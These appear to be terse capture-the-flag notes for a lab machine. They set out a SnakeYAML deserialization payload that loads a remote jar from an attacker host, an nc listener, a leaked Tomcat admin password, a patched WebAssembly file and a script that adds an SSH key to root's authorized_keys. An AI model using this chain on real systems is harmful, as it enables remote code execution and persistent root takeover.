@@ -1,0 +1,60 @@
+go to 8080
+see the yaml parser
+add a '
+see snake yaml exploit
+javac src/artsploit/AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ ./
+mv yaml-payload.jar ../
+
+setup webserver
+    sudo python3 -m http.server 80
+setup listener
+    nc -lnvp 443
+
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.16.39/yaml-payload.jar"]
+  ]]
+]
+
+run this twice, not sure why
+
+cat tomcat config xml file
+<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
+
+sudo -l
+
+git clone https://github.com/WebAssembly/wabt.git
+
+download main.wasm
+
+convert wasm to wat
+./wasm2wat ../../main.wasm -o ../../main.wat
+
+cat wat
+
+cat main.wat                                                                                                                                                                                           1 ⨯
+(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 1) <-------------------------------- this will be 0 change to 1, this is the f variable
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export "memory" (memory 0))
+  (export "info" (func $info))
+  (export "__data_end" (global 1))
+  (export "__heap_base" (global 2)))
+
+./wat2wasm ../../main.wat -o ../../main-fixed.wasm
+
+create deploy.sh in any directory
+#!/bin/bash
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbIgZx6qQTf8ds6f0yWtZQQ4ovHyTNv23YKnermUDzrArj6ukcEm5xTuVGmccUwBjHykbdUZAHdXb96zJ9KaPYfXXRARytYoDV1rjU4tpHCzVK7WJj647XTbtC69m/JUdA1wOKr9g2Y/2Bj9Q5B7g8DuHix/VdbFpwXiSOIj1SmsLchvdC9LlKHHRa9wbzTqVjoBW+CS9Cwvdh36O+dt0ac3MlERxAnZLvE3rHuurjdFzMOp9HwvDxxwgYbgS2ir3LEutWFfoGYf6G2GT6192zWyisFyAMD1Ip47R7LhTIVhyXW61ixvfETFUFpasvbh0dz3tgz8kimcfIPR9LCoRtHeIk+uNPvjYNCD4KneBLTOqnmrotaCztvyl819KjCxhJSLFk9z6+lge76c427LxeuEBHrK9x8dYauEvfty/D2/UFvF8BoIEu6f6llzw5k3XsC6ImaMGQJKgVI64ZsF3wM3ETdFAZhmwkQh4PHPffNHlokoF5++ngIWzGQZBZOns= kali@kali
+" >> /root/.ssh/authorized_keys
+
+execute sudo /usr/bin/go run /opt/wasm-functions/index.go any writable directory with the fixed main.wasm and deploy.sh
+
+ssh root@10.10.10.227
